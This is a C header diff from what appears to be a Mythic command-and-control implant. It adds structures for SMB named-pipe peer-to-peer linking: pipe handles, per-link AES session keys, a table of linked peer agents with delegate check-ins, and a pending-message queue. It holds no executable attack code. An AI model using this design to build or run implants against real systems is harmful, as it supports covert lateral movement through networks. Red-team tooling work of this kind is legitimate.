@@ -299,7 +299,32 @@ typedef struct _INSTANCE {
     // SMB config
     struct {
         char     pipename[256];
+        HANDLE   pipe;                  // server pipe handle
+        BYTE     link_key[32];          // active link-client session key (client's payload AES key)
+        BOOL     have_link_key;
     } Smb;
+
+    // Linked P2P peers (link/unlink) - client-side registry of agents we linked to
+#define ES_MAX_LINKED_PEERS 8
+    struct {
+        char   host[256];
+        char   pipename[256];
+        char   uuid[37];
+        HANDLE pipe;
+        BOOL   active;
+        BOOL   checkin_sent;   // delegate checkin sent to Mythic via ACTION_LINK_ADD
+        BYTE*  delegate_checkin_b64;  // base64 encoded encrypted checkin blob from peer
+        DWORD  delegate_checkin_b64_len;
+    } LinkedPeers[ES_MAX_LINKED_PEERS];
+    DWORD  LinkedPeerCount;
+
+    // Pending action-byte messages queued by cmd_link/cmd_unlink for the main loop to send
+#define ES_MAX_PENDING_MSGS 16
+    struct {
+        BYTE*  data;
+        DWORD  len;
+    } PendingMsgs[ES_MAX_PENDING_MSGS];
+    DWORD  PendingMsgCount;
 
     // UDRL user data (savedUserData is a by-value copy; pUserData points to it)
     USER_DATA   savedUserData;
